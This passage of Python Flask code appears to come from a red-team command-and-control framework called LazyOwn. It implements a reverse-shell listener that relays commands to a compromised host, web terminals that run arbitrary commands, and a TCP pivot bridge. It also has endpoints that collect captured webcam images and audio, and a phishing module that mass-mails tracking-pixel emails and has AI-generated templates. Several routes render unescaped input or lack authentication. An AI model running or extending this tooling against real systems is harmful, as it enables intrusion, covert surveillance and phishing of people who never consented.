        return jsonify({"error": "Insert Prompt"}), 400

    response = process_prompt_general(client, prompt, debug)
    return jsonify({"response": response})

@app.route('/csv_to_html', methods=['POST'])
def csv_to_html():
    response = decoy()
    if response:
        return response
    file_path = request.json.get('file_path')
    if not file_path:
        return jsonify({"error": "No file path provided"}), 400

    path = os.getcwd()
    sessions = f"{path}/sessions/"
    file_path = sessions + secure_filename(file_path)

    sanitized_file_path = os.path.normpath(file_path)
    sanitized_file_path = os.path.realpath(sanitized_file_path)

    
    allowed_directory_realpath = os.path.realpath(ALLOWED_DIRECTORY)
    if not sanitized_file_path.startswith(allowed_directory_realpath):
        return jsonify({"error": "Invalid file path"}), 403

    
    relative_path = os.path.relpath(sanitized_file_path, allowed_directory_realpath)
    
    if '..' in relative_path or relative_path.startswith('/'):
        return jsonify({"error": "Invalid file path"}), 403
    
    full_path = os.path.join(allowed_directory_realpath, relative_path)
    

    
    try:
        with open(full_path, 'r') as file:
            reader = csv.reader(file)
            headers = next(reader)
            rows = list(reader)

            html = '<table border="1"><tr>'
            html += ''.join(f'<th>{header}</th>' for header in headers)
            html += '</tr>'

            for row in rows:
                html += '<tr>'
                html += ''.join(f'<td>{cell}</td>' for cell in row)
                html += '</tr>'

            html += '</table>'

            return html

    except Exception as e:
        return jsonify({"error": str("audio")}), 500

@app.route('/search_results', methods=['POST'])
def search_results():
    response = decoy()
    if response:
        return response    
    term = request.form.get('input')
    md_content = search_database(term,"parquets/techniques.parquet")
    html_content = markdown.markdown(md_content)
    md_content_d = search_database(term,"parquets/detalles.parquet")
    html_content2 = markdown.markdown(md_content_d)
    md_content_b = search_database(term,"parquets/binarios.parquet")
    html_content3 = markdown.markdown(md_content_b)
    headers_content = render_template('header2.html')
    footer = render_template('footer.html')
    return render_template_string(headers_content + html_content+html_content2+html_content3+footer )

@app.route('/graph')
def graph():
    response = decoy()
    if response:
        return response    
    return render_template('graph.html')

@app.route('/task/<int:task_id>')
def task(task_id):
    response = decoy()
    if response:
        return response    
    tasks = load_tasks()
    task = next((t for t in tasks if t['id'] == task_id), None)
    if not task:
        flash('Task not found!', 'danger')
        return redirect(url_for('index'))
    task_description = markdown.markdown(task['description'])
    return render_template('task.html', task=task, task_description=task_description)

@app.route('/gettasks', methods=['GET'])
def get_tasks():
    response = decoy()
    if response:
        return response    
    tasks = load_tasks()
    return jsonify(tasks)
    
@app.route('/tasks', methods=['GET'])
def tasks():
    response = decoy()
    if response:
        return response    
    tasks = load_tasks()
    return render_template('tasks.html', tasks=tasks)
    
@app.route('/task/<int:task_id>/edit', methods=['GET', 'POST'])
def edit_task(task_id):
    response = decoy()
    if response:
        return response    
    tasks = load_tasks()
    task = next((t for t in tasks if t['id'] == task_id), None)
    if not task:
        flash('Task not found!', 'danger')
        return redirect(url_for('index'))

    if request.method == 'POST':
        title = request.form['title']
        description = request.form['description']
        operator = request.form['operator']
        status = request.form['status']
        valid_statuses = ["New", "Refined", "Started", "Review", "Qa", "Done", "Blocked"]

        if status not in valid_statuses:
            return "Invalid status selected!", 400
        task['title'] = title
        task['description'] = description
        task['operator'] = operator
        task['status'] = status

        save_tasks(tasks)
        flash('Task updated successfully!', 'success')
        return redirect(url_for('task', task_id=task_id))

    task_description = markdown.markdown(task['description'])
    return render_template('edit_task.html', task=task, task_description=task_description)

    
@app.route('/cves', methods=['GET', 'POST'])
def cves():
    response = decoy()
    cves = load_cves()
    if response:
        return response
    if request.method == 'POST':
        title = request.form['title']
        description = request.form['description']
        operator = request.form['operator']
        risk = request.form['risk']
        valid_statuses = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFORMATIONAL"]

        if risk not in valid_statuses:
            return "Invalid Risk selected!", 400
        
        new_cve = {
            'id': len(cves),
            'title': title,
            'description': description,
            'operator': operator,
            'risk': risk
        }
        cves.append(new_cve)
        save_cves(cves)
        flash('Task created successfully!', 'success')
        return redirect(url_for('index'))

    return render_template('cves.html', cves=cves)

@app.route('/cve/<int:cve_id>')
def cve(cve_id):
    response = decoy()
    if response:
        return response    
    cves = load_cves()
    cve = next((t for t in cves if t['id'] == cve_id), None)
    if not cve:
        flash('CVE not found!', 'danger')
        return redirect(url_for('index'))
    cve_description = markdown.markdown(cve['description'])
    return render_template('cve.html', cve=cve, cve_description=cve_description)

@app.route('/cve/<int:cve_id>/edit', methods=['GET', 'POST'])
def edit_cve(cve_id):
    response = decoy()
    if response:
        return response    
    cves = load_cves()
    cve = next((t for t in cves if t['id'] == cve_id), None)
    if not cve:
        flash('Task not found!', 'danger')
        return redirect(url_for('index'))

    if request.method == 'POST':
        title = request.form['title']
        description = request.form['description']
        operator = request.form['operator']
        status = request.form['status']
        valid_statuses = ["New", "Refined", "Started", "Review", "Qa", "Done", "Blocked"]

        if status not in valid_statuses:
            return "Invalid status selected!", 400
        cve['title'] = title
        cve['description'] = description
        cve['operator'] = operator
        cve['status'] = status

        save_cves(cves)
        flash('Task updated successfully!', 'success')
        return redirect(url_for('cve', cve_id=cve_id))

    cve_description = markdown.markdown(cve['description'])
    return render_template('edit_cve.html', cve=cve, cve_description=cve_description)


@app.route('/notes', methods=['GET', 'POST'])
def edit_notes():
    response = decoy()
    if response:
        return response    
    if request.method == 'POST':
        content = str(request.form['content'])
        notes = content
        save_note(notes)
        flash('Notes updated successfully!', 'success')
        shell.onecmd('create_session_json')
        return redirect(url_for('view_note'))

    notes = load_note()
    return render_template('edit_note.html', note=notes)

@app.route('/getnotes', methods=['GET'])
def get_notes():
    response = decoy()
    if response:
        return response    
    notes = load_note()
    return jsonify(notes)

@app.route('/view_note')
def view_note():
    response = decoy()
    if response:
        return response    
    note = load_note()
    return render_template('view_note.html', note=note)

@app.route('/push_notification', methods=['POST'])
def push_notification():
    html_content = request.form.get('html')
    if not html_content:
        return jsonify({"error": "HTML content is required"}), 400
    notifications = load_notifications()
    notifications.append({"html": html_content})
    JSON_FILE_PATH = "sessions/notifications.json"
    with open(JSON_FILE_PATH, 'w') as f:
        json.dump(notifications, f, indent=4)

    return jsonify({"message": "Notification saved successfully"}), 200


@app.route('/edit_event/<event_name>', methods=['GET', 'POST'])
def edit_event(event_name):
    response = decoy()
    if response:
        return response    
    event_config = load_event_config()

    event = next((e for e in event_config["events"] if e["name"] == event_name), None)

    if not event:
        return "Event not found", 404

    if request.method == 'POST':
        
        event.update({
            "name": request.form["title"],
            "src_path": request.form["src_path"],
            "size": int(request.form["size"]),
            "description": request.form["description"],
            "outputtype": request.form["outputtype"],
            "outputtodelete": request.form["outputtodelete"],
            "prompt": request.form["prompt"],
            "operator": request.form["operator"],
            "status": request.form["status"]
        })
        
        with open('event_config.json', 'w') as f:
            json.dump(event_config, f, indent=4)
        return redirect(url_for('get_event_config_view'))

    return render_template('edit_event.html', event=event)

@app.route('/event_config', methods=['GET'])
def get_event_config():
    event_config = load_event_config()
    return jsonify(event_config)

@app.route('/event_config_view', methods=['GET', 'POST'])
def get_event_config_view():
    response = decoy()
    if response:
        return response    
    if request.method == 'POST':
        event = {
            "name": request.form.get("title"),
            "src_path": request.form.get("src_path"),
            "size": int(request.form.get("size", 0)),
            "description": request.form.get("description"),
            "outputtype": request.form.get("outputtype"),
            "outputtodelete": request.form.get("outputtodelete"),
            "prompt": request.form["prompt"],
            "operator": request.form.get("operator"),
            "status": request.form.get("status")
        }

        event_config = load_event_config()

        
        if "events" not in event_config:
            event_config["events"] = []

        event_config["events"].append(event)

        with open('event_config.json', 'w') as f:
            json.dump(event_config, f, indent=4)

        return redirect(url_for('get_event_config_view'))

    event_config = load_event_config()
    return render_template('event_config_view.html', event_config=event_config)

@app.route('/aicmd', methods=['GET'])
def aicmd_view():
    cmd = request.args.get('arg')

    INVALID = "Unknown command"
    
    if cmd == "1":
        command = "ping"
    elif cmd == "2":
        command = "gospider ssl"
    else:
        command = INVALID
    
    if command != INVALID:
        response = aicmd_deepseek(command)

        return jsonify(response)
    else:
        return jsonify({"error": "Arg not allowed"}), 400

@app.route('/events', methods=['GET'])
def get_events():
    client_ip = request.remote_addr
    if current_user.is_authenticated:
        if config.enable_c2_debug == True:
            logger.info(f"Autenticated. Wellcome {client_ip}") 
    else:
        if config.enable_c2_debug == True:
            logger.info("Unautenticated.")
        return redirect(url_for('login'))    
    global events
    event_config = load_event_config()
    response = {
        "events": events
    }
    global BASE_DIR

    for event in event_config["events"]:
        response[event["name"]] = {"exist": False}

    for event in event_config["events"]:
        event_key = event["name"]
        src_path = event["src_path"].format(BASE_DIR=BASE_DIR, rhost=rhost)
        size = event["size"]

        matching_events = [
            e for e in events
            if e["src_path"] == src_path and e["size"] > size
        ]

        if matching_events:
            response[event_key]["exist"] = True

    return jsonify(response)


@app.route('/tools', methods=['GET'])
def list_tools():
    response = decoy()
    if response:
        return response    
    tools = [f for f in os.listdir(TOOLS_DIR) if f.endswith('.tool')]
    return render_template('list_tools.html', tools=tools)


@app.route('/tools/create', methods=['GET', 'POST'])
def create_tool():
    response = decoy()
    config = load_payload()
    if response:
        return response
    if request.method == 'POST':
        toolname = request.form['toolname']
        command = request.form['command']
        trigger = request.form.getlist('trigger')
        active = request.form.get('active') == 'true'
        securetoolname = secure_filename(toolname)
        for key, value in config.items():
            command = command.replace(f'{{{str(key)}}}', str(value))

        tool_data = {
            "toolname": securetoolname,
            "command": command,
            "trigger": trigger,
            "active": active
        }
        
        tool_path = os.path.join(TOOLS_DIR, f'{securetoolname}.tool')
        with open(tool_path, 'w') as file:
            json.dump(tool_data, file, indent=4)

        return redirect(url_for('list_tools'))

    return render_template('create_tool.html', config=config, current_user=current_user)

@app.route('/tools/<toolname>', methods=['GET'])
def view_tool(toolname):
    response = decoy()
    if response:
        return response    
    tools = []
    for filename in os.listdir(TOOLS_DIR):
        if filename.endswith('.tool'):
            tool_path_safe = os.path.join(TOOLS_DIR, filename)
            with open(tool_path_safe, 'r') as file:
                tool_data = json.load(file)
                tool_data['filename'] = filename  
                tools.append(tool_data)

    valid_tool = None
    for tool in tools:
        if toolname == tool['filename'].replace('.tool', ''):
            valid_tool = tool
            break

    if not valid_tool:
        abort(404, description="Herramienta no encontrada o no válida")

    tool_path = os.path.join(TOOLS_DIR, tool['filename'])    

    with open(tool_path, 'r') as file:
        tool_data = json.load(file)
    return render_template('view_tool.html', tool=tool_data)

@app.route('/tools/<toolname>/update', methods=['GET', 'POST'])
def update_tool(toolname):
    response = decoy()
    config = load_payload()
    if response:
        return response
    
    tools = []
    for filename in os.listdir(TOOLS_DIR):
        if filename.endswith('.tool'):
            tool_path_safe = os.path.join(TOOLS_DIR, filename)
            with open(tool_path_safe, 'r') as file:
                tool_data = json.load(file)
                tool_data['filename'] = filename  
                tools.append(tool_data)

    valid_tool = None
    for tool in tools:
        if toolname == tool['filename'].replace('.tool', ''):
            valid_tool = tool
            break

    if not valid_tool:
        abort(404, description="Herramienta no encontrada o no válida")

    tool_path = os.path.join(TOOLS_DIR, tool['filename'])
    if request.method == 'POST':
        command = request.form['command']
        trigger = request.form.getlist('trigger')
        active = request.form.get('active') == 'true'
        
        for key, value in config.items():
            command = command.replace(f'{{{str(key)}}}', str(value))

        tool_data = {
            "toolname": toolname,
            "command": command,
            "trigger": trigger,
            "active": active
        }

        with open(tool_path, 'w') as file:
            json.dump(tool_data, file, indent=4)

        return redirect(url_for('list_tools'))

    with open(tool_path, 'r') as file:
        tool_data = json.load(file)

    return render_template('edit_tool.html', tool=tool_data, config=config)

@app.route('/tools/<toolname>/delete', methods=['POST'])
def delete_tool(toolname):
    response = decoy()
    if response:
        return response

    tools = []
    for filename in os.listdir(TOOLS_DIR):
        if filename.endswith('.tool'):
            tool_path_safe = os.path.join(TOOLS_DIR, filename)
            with open(tool_path_safe, 'r') as file:
                tool_data = json.load(file)
                tool_data['filename'] = filename  
                tools.append(tool_data)

    valid_tool = None
    for tool in tools:
        if toolname == tool['filename'].replace('.tool', ''):
            valid_tool = tool
            break

    if not valid_tool:
        abort(404, description="Herramienta no encontrada o no válida")

   
    tool_path = os.path.join(TOOLS_DIR, valid_tool['filename'])

    try:
        os.remove(tool_path)
    except OSError as e:
        return f"Error al eliminar el archivo:", 500

    return redirect(url_for('list_tools'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    response = decoy()
    if response:
        return response    
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        if not username or not password:
            flash('Uername and password is mandatory.', 'error')
            return redirect(url_for('register'))

        if len(password) < 8:
            flash('Password at least 8 chars.', 'error')
            return redirect(url_for('register'))

        users = load_users()

        if any(user['username'] == username for user in users):
            flash('Username Exist.', 'error')
            return redirect(url_for('register'))
        new_user = {
            'id': len(users) + 1,
            'username': username,
            'password_hash': generate_password_hash(password),
            'elo': 0
        }
        users.append(new_user)
        save_users(users)

        flash('Success, Please Login.', 'success')
        return redirect(url_for('login'))

    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
@limiter.limit(config.c2_login_limit)
def login():
    response = decoy()
    if response:
        return response    
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        users = load_users()
        user_data = next((user for user in users if user['username'] == username), None)

        if user_data and check_password_hash(user_data['password_hash'], password):
            user = User(user_data)
            login_user(user)
            flash('Wellcome to LazyOwn .', 'success')
            return redirect(url_for('profile'))
        else:
            flash('Error Login incorrect .', 'error')

    return render_template('login.html')

@app.route('/profile')
@login_required
def profile():
    response = decoy()
    if response:
        return response    
    karma_name = get_karma_name(current_user.elo)
    return render_template('profile.html', user=current_user, karma_name=karma_name)

@app.route('/logout')
@login_required
def logout():
    response = decoy()
    if response:
        return response    
    logout_user()
    flash('Successfully Logout...', 'success')
    return redirect(url_for('index'))

@app.route('/aumentar_elo/<int:user_id>', methods=['POST'])
def aumentar_elo_route(user_id):
    response = decoy()
    if response:
        return response    
    data = request.get_json()
    cantidad = data.get('cantidad', 0)

    if cantidad <= 0:
        return jsonify({"error": "Error elo must be abs."}), 400

    aumentar_elo(user_id, cantidad)
    return jsonify({"message": f"The Elo {user_id} increased in {cantidad} points."}), 200

@app.route('/banners')
def banners():
    response = decoy()
    if response:
        return response    
    banners_json = load_banners()
    if not banners_json:
        return render_template('banners.html', title="Target's Information", content="No banners found.")
    html_table = '<table class="table table-dark table-striped">\n'
    html_table += '  <thead>\n'
    html_table += '    <tr>\n'
    html_table += '      <th>Hostname</th>\n'
    html_table += '      <th>Port</th>\n'
    html_table += '      <th>Protocol</th>\n'
    html_table += '      <th>Extra</th>\n'
    html_table += '      <th>Service</th>\n'
    html_table += '    </tr>\n'
    html_table += '  </thead>\n'
    html_table += '  <tbody>\n'

    for banner in banners_json:
        html_table += '    <tr>\n'
        html_table += f'      <td>{banner["hostname"]}</td>\n'
        html_table += f'      <td>{banner["port"]}</td>\n'
        html_table += f'      <td>{banner["protocol"]}</td>\n'
        html_table += f'      <td>{banner["extra"]}</td>\n'
        html_table += f'      <td>{banner["service"]}</td>\n'
        html_table += '    </tr>\n'

    html_table += '  </tbody>\n'
    html_table += '</table>'

    return render_template('banners.html', title="Target's Information", content=html_table)



@app.route('/mitre')
def mitre():
    response = decoy()
    if response:
        return response        
    page_arg = request.args.get('page', '1')
    page = int(re.sub(r'\D', '', page_arg) or '1')
    per_page = 10

    mitre_data = load_mitre_data()
    tactics = [t for t in mitre_data['objects'] if t['type'] == 'x-mitre-tactic']
    techniques = [t for t in mitre_data['objects'] if t['type'] == 'attack-pattern']

    total = len(techniques)
    pages = ceil(total / per_page)
    start = (page - 1) * per_page
    end = start + per_page

    paginated_techniques = techniques[start:end]

    return render_template('mitre.html', title="MITRE ATT&CK Techniques", tactics=tactics, techniques=paginated_techniques, page=page, pages=pages)

@app.route('/get_connected_clients', methods=['GET'])
def get_connected_clients():
    response = decoy()
    if response:
        return response
    global connected_clients
    connected_clients_list = list(connected_clients)
    return jsonify({"connected_clients": connected_clients_list})

@app.route('/lazybot', methods=['POST'])
def lazybot():
    data = request.json
    prompt = data.get('prompt')

    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    if not isinstance(prompt, str):
        prompt = str(prompt)

    response = process_prompt_local(prompt, False, "web")
    return response

@app.route('/lazyreport', methods=['POST'])
def lazyreport():
    if not request.is_json:
        return jsonify({"error": "Content-Type must be application/json"}), 400

    data = request.json
    prompt = data.get('prompt')

    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    if not isinstance(prompt, str):
        prompt = str(prompt)

    response = process_prompt_localreport(prompt, False, "web")
    return response

@app.route('/teamserver', methods=['GET', 'POST'])
def teamserver():
    if request.method == 'POST':
        form_data = {
            'assessment_information': request.form['assessment_information'],
            'engagement_overview': request.form['engagement_overview'],
            'service_description': request.form['service_description'],
            'campaign_objectives': request.form['campaign_objectives'],
            'process_and_methodology': request.form['process_and_methodology'],
            'scoping_and_rules': request.form['scoping_and_rules'],
            'executive_summary_findings': request.form['executive_summary_findings'],
            'executive_summary_narrative': request.form['executive_summary_narrative'],
            'summary_vulnerability_overview': request.form['summary_vulnerability_overview'],
            'security_labs_toolkit': request.form['security_labs_toolkit'],
            'appendix_a_changes': request.form['appendix_a_changes']
        }
        with open(JSON_FILE_PATH_REPORT, 'w') as json_file:
            json.dump(form_data, json_file)

        return render_template('teamserver.html', form_data=form_data)

    else:
        with open(JSON_FILE_PATH_REPORT, 'r') as json_file:
            form_data = json.load(json_file)

        return render_template('teamserver.html', form_data=form_data)

@app.route('/report', methods=['GET'])
def report():
    json_path = f"sessions/sessionLazyOwn.json"
    with open(JSON_FILE_PATH_REPORT, 'r') as json_file:
        report_data = json.load(json_file)
    tools = []
    for filename in os.listdir(TOOLS_DIR):
        if filename.endswith('.tool'):
            tool_path = os.path.join(TOOLS_DIR, filename)
            with open(tool_path, 'r') as file:
                tool_data = json.load(file)
                tool_data['filename'] = filename
                tools.append(tool_data)
    tasks = load_tasks()
    cves = load_cves()
    with open(json_path, 'r') as f:
        session_data = json.load(f)

    
    if isinstance(session_data, list):
        session_data = session_data[0] if session_data else {}

    session_data['params'] = make_serializable(session_data.get('params', {}))
    session_data['params']['api_key'] = 'Hidden conntent'
    implants_check()
    return render_template('report.html', report_data=report_data, tools=tools, tasks=tasks, cves=cves, session_data=session_data, implants=implants)

@app.route('/connect')
def connect():
    return render_template('connect.html')

@app.route('/listener')
def listener():
    return f"WebSocket listener is running on port {reverse_shell_port}."

@socketio.on('connect', namespace='/listener')
def handle_connect():
    if config.enable_c2_debug == True:
        logger.info('Client connected to /listener')
    emit('output', 'Welcome to LazyOwn RedTeam Framework: CRIMEN 👋\r\n$ ')

@socketio.on('disconnect', namespace='/listener')
def handle_disconnect():
    if config.enable_c2_debug == True:
        logger.info('Client disconnected from /listener')

@socketio.on("pty-input", namespace="/pty")
def pty_input(data):
    """Recibe entrada del terminal web y la escribe al PTY"""
    if app.config["fd"]:
        try:
            os.write(app.config["fd"], data["input"].encode())
        except Exception as e:
            logger.error(f"Error escribiendo entrada:")

@socketio.on("resize", namespace="/pty")
def resize(data):
    """Maneja el redimensionamiento de la terminal"""
    if app.config["fd"]:
        if config.enable_c2_debug == True:
            logger.info(f"Redimensionando terminal a {data['rows']}x{data['cols']}")
        set_winsize(app.config["fd"], data["rows"], data["cols"])

@socketio.on("connect", namespace="/pty")
def connect():
    """Maneja nueva conexión de cliente"""
    if config.enable_c2_debug == True:
        logger.info("Nuevo cliente conectado")
    
    if app.config["child_pid"]:
        return  

    try:
        
        (child_pid, fd) = pty.fork()
        
        if child_pid == 0:
            
            subprocess.run([
                "python3", "lazyown.py"
            ], check=True)
        else:
            
            app.config["fd"] = fd
            app.config["child_pid"] = child_pid
            
            
            set_winsize(fd, 80, 140)
            
            
            socketio.start_background_task(read_and_forward_pty_output)
            if config.enable_c2_debug == True:
                logger.info(f"Proceso hijo iniciado con PID {child_pid}")
            
    except Exception as e:
        logger.error(f"Error iniciando shell:")

@socketio.on('input')
def handle_input(data):
    command = data.get('value')
    if not command:
        return
    if config.enable_c2_debug == True:
        logger.info(f'[CMD] Received: {command}')
    
    
    shell.stdin.write(command + '\n')
    command_out = shell.one_cmd(command)
    shell.stdin.seek(0)
    
    
    output = shell.stdout.getvalue()
    shell.stdout.truncate(0)
    shell.stdout.seek(0)
    
    emit('output', command_out + '$ ')

@socketio.on('command', namespace='/listener')
def handle_command(msg):
    if config.enable_c2_debug == True:
        logger.info('Received command: ' + msg)
    try:
     
        reverse_shell_socket.sendall((msg + "\n").encode())
    except Exception as e:
        emit('response', {'output': str("audio")}, namespace='/listener')


@app.route('/terminal')
def terminal():
    return render_template('terminal.html')


@socketio.on('connect', namespace='/terminal')
def handle_connect():
    if not current_user.is_authenticated:
        disconnect()
        return False
    if config.enable_c2_debug == True:
        logger.info("Cliente conectado a /terminal")


@socketio.on('disconnect', namespace='/terminal')
def handle_disconnect():
    if config.enable_c2_debug == True:
        logger.info("Cliente desconectado de /terminal")

@socketio.on('input', namespace='/terminal')
def handle_input(data):
    command = data.get("command")
    client_id = data.get("client_id")
    if command and client_id:
        output = execute_command(command)
        socketio.emit('output', {
            'client_id': client_id,
            'output': output
        }, namespace='/terminal')

@socketio.on('command', namespace='/terminal')
def handle_command(data):
    cmd = data.get('cmd')
    if not cmd:
        return
    if config.enable_c2_debug == True:
        logger.info(f"Ejecutando comando: {cmd}")
    output = execute_command(cmd)
    emit('response', {'output': output})
    
@socketio.on('resize', namespace='/terminal')
def handle_resize(data):
    if app.config["fd"]:
        set_winsize(app.config["fd"], data["rows"], data["cols"])

def start_reverse_shell():
    global reverse_shell_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', reverse_shell_port))
    server_socket.listen(1)
    if config.enable_c2_debug == True:
        logger.info(f"Listening for reverse shell on port {reverse_shell_port}...")

    reverse_shell_socket, addr = server_socket.accept()
    if config.enable_c2_debug == True:
        logger.info(f"Connection from {addr}")
    while True:
        data = reverse_shell_socket.recv(1024)
        if not data:
            break
        socketio.emit('response', {'output': data.decode()}, namespace='/listener')

@app.route('/start_bridge', methods=['POST'])
@requires_auth
def start_bridge():
    """Start a TCP bridge to a specified remote host and port."""
    response = decoy()
    if response:
        return response    
    local_port = int(request.form['local_port'])
    remote_host = request.form['remote_host']
    remote_port = int(request.form['remote_port'])
    bridge_thread = threading.Thread(target=tcp_bridge, args=(local_port, remote_host, remote_port))
    bridge_thread.start()

    return jsonify({"status": "success", "message": f"TCP bridge started on port {local_port} to {remote_host}:{remote_port}"}), 200

@app.errorhandler(404)
def page_not_found(e):
    response = decoy()
    if response:
        return response    
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_server_error(e):
    response = decoy()
    if response:
        return response    
    return render_template('500.html'), 500

@app.route('/config.json')
def get_config():
    """
    Lee el archivo payload.json, lo manipula y lo expone como /config.json.
    """
    try:
        with open('payload.json', 'r') as f:
            payload = json.load(f)
    except FileNotFoundError:
        return jsonify({"error": "payload.json not found"}), 404
    except json.JSONDecodeError:
        return jsonify({"error": "Invalid JSON format in payload.json"}), 500

    sanitized_payload = sanitize_json(payload)
    final_payload = add_dynamic_data(sanitized_payload)

    return jsonify(final_payload)

@app.route('/capture', methods=['POST'])
def capture_image():
    try:
        
        data = request.get_json()
        if not data or 'image' not in data:
            logging.error("Solicitud sin datos de imagen")
            return jsonify({"error": "No se proporcionó imagen"}), 400

        
        image_data = data['image']
        if image_data.startswith('data:image/png;base64,'):
            image_data = image_data.split(',')[1]
        image_bytes = base64.b64decode(image_data)

        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{SAVE_DIR}/capture_{timestamp}.png"

        
        with open(filename, 'wb') as f:
            f.write(image_bytes)

        logging.info(f"Imagen guardada: {filename}")
        return jsonify({"status": "success", "message": "Imagen recibida y guardada"}), 200
    except Exception as e:
        logging.error(f"Error procesando imagen")
        return jsonify({"error": str("audio")}), 500

@app.route('/audio', methods=['POST'])
def capture_audio():
    try:
        if 'audio' not in request.files:
            logging.error("Solicitud sin datos de audio")
            return jsonify({"error": "No se proporcionó audio"}), 400
        audio_file = request.files['audio']
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{SAVE_DIR}/audio_{timestamp}.webm"
        audio_file.save(filename)
        logging.info(f"Audio guardado: {filename}")
        return jsonify({"status": "success", "message": "Audio recibido y guardado"}), 200
    except Exception as e:
        logging.error(f"Error procesando audio")
        return jsonify({"error": str("audio")}), 500

@app.route('/surface')
def surface():
    return render_template('surface.html')

@app.route('/data')
def get_data():
    shell.onecmd('process_scans')
    data = load_data()
    if not data:
        return jsonify({"error": "No se pudo cargar data.json"}), 500
    return jsonify(data)

@app.route('/upload_zip', methods=['POST'])
def upload_zip_file():
    """Handles the file upload, processes the BloodHound ZIP, and prepares data for visualization."""
    if 'file' not in request.files:
        return render_template('index.html', error="No file part")
    file = request.files['file']
    if file.filename == '':
        return render_template('index.html', error="No selected file")
    
    if not file.filename.lower().endswith('.zip'):
        return render_template('index.html', error="Only ZIP files are allowed")

    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

    unique_filename = f"{uuid.uuid4().hex}.zip"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)

    abs_upload_folder = os.path.abspath(app.config['UPLOAD_FOLDER'])
    abs_filepath = os.path.abspath(filepath)
    if not abs_filepath.startswith(abs_upload_folder):
        return render_template('index.html', error="Invalid file path")

    try:
        file.save(filepath)
        
        nodes, edges, error_message, ad_data = process_bloodhound_zip(filepath)

        try:
            os.remove(filepath)
        except Exception as e:
            if config.enable_c2_debug:
                logger.info(f"Error removing file: {str("")}")

        if error_message:
            if config.enable_c2_debug:
                logger.info(f"Error during processing: {error_message}")
            return render_template('index.html', error=error_message)

        if not nodes and not edges:
            return render_template('index.html', error="No valid data extracted from the ZIP")
        
        if config.enable_c2_debug:
            logger.info(f"Nodes extracted: {len(nodes)}")
            logger.info(f"Edges extracted: {len(edges)}")
            logger.info(f"Attack vectors extracted: {len(ad_data)}")
        return render_template('surface.html', nodes=nodes, edges=edges, ad_data=ad_data)

    except Exception as e:
        if os.path.exists(filepath):
            try:
                os.remove(filepath)
            except Exception as cleanup_error:
                if config.enable_c2_debug:
                    logger.info(f"Error removing file during cleanup: {str("")}")
        return render_template('index.html', error=f"Error processing file: {str("")}")

@phishing_bp.route('/phishing/campaigns', methods=['GET'])
@login_required
def list_campaigns():
    campaigns = []
    for filename in os.listdir(CAMPAIGNS_DIR):
        if filename.endswith('.yaml'):
            campaign = load_yaml_safely(os.path.join(CAMPAIGNS_DIR, filename))
            if campaign:
                campaign['id'] = filename.replace('.yaml', '')
                campaigns.append(campaign)
    return render_template('phishing/campaigns.html', campaigns=campaigns)

@phishing_bp.route('/phishing/campaigns/new', methods=['GET', 'POST'])
@login_required
def create_campaign():
    if request.method == 'POST':
        data = request.form
        campaign_id = str(uuid.uuid4())

        if not data.get('name') or not data.get('template') or not data.get('recipients'):
            flash('Name, template, and recipients are required.', 'error')
            return redirect(url_for('phishing.create_campaign'))

        beacon_url = data.get('beacon_url', '')
        if not beacon_url:
            logger.warning(f"Campaign {campaign_id} created with empty beacon_url")
            short_url = secrets.token_urlsafe(6)
            short_urls = load_short_urls()
            short_urls[short_url] = {
                'original_url': f'http://{request.host}/track/{short_url}',
                'active': True,
                'created_at': datetime.now().isoformat()
            }
            save_short_urls(short_urls)
            beacon_url = f'http://{request.host}/{short_url}'

        campaign = {
            'name': data['name'],
            'template': data['template'],
            'recipients': [r.strip() for r in data['recipients'].split(',')],
            'beacon_url': beacon_url,
            'created_at': datetime.now(timezone.utc).isoformat()
        }
        try:
            with open(os.path.join(CAMPAIGNS_DIR, f'{campaign_id}.yaml'), 'w') as f:
                yaml.safe_dump(campaign, f)
            logger.info(f"Campaign {campaign_id} saved successfully")
        except Exception as e:
            logger.error(f"Error saving campaign {campaign_id}: {e}")
            flash('Failed to save campaign.', 'error')
            return redirect(url_for('phishing.create_campaign'))

        try:
            template_file = os.path.join(TEMPLATES_DIR, f"{campaign['template']}.yaml")
            template = load_yaml_safely(template_file)
            if not template:
                flash('Invalid email template.', 'error')
                return redirect(url_for('phishing.create_campaign'))

            with yagmail.SMTP(GMAIL_ADDRESS, GMAIL_APP_PASSWORD) as yag:
                for recipient in campaign['recipients']:
                    tracking_url = url_for('phishing.track_pixel', campaign_id=campaign_id, email=recipient, _external=True)
                    html_body = template['body'].format(
                        name=recipient.split('@')[0],
                        beacon_url=campaign['beacon_url'],
                        tracking_pixel=f'<img src="{tracking_url}" width="1" height="1" alt="" />'
                    )
                    yag.send(
                        to=recipient,
                        subject=template['subject'],
                        contents=html_body
                    )
                    logger.info(f"Sent email to {recipient} for campaign {campaign_id}")

                    conn = sqlite3.connect(DB_PATH)
                    conn.execute('INSERT INTO tracking VALUES (?, ?, ?, ?, ?)',
                                 (campaign_id, recipient, 'sent', request.remote_addr, datetime.now().isoformat()))
                    conn.commit()
                    conn.close()

            flash(f"Campaign {campaign['name']} sent to {len(campaign['recipients'])} recipients.", 'success')
            return redirect(url_for('phishing.list_campaigns'))
        except Exception as e:
            logger.error(f"Error sending campaign {campaign_id}: {e}")
            flash('Failed to send campaign emails.', 'error')
            return redirect(url_for('phishing.create_campaign'))
    templates = [f.replace('.yaml', '') for f in os.listdir(TEMPLATES_DIR) if f.endswith('.yaml')]
    return render_template('phishing/new_campaign.html', templates=templates)

@app.route('/lazyphishingai', methods=['POST'])
def lazyphishingai():
    data = request.json
    prompt = data.get('prompt')
    timestamp = time.time()
    OUTPUT_FILE_YAML = TEMPLATES_DIR + f"/ai_template_{timestamp}.yaml"
    if not prompt:
        return jsonify({"error": "Insert Prompt"}), 400

    if not isinstance(prompt, str):
        prompt = str(prompt)

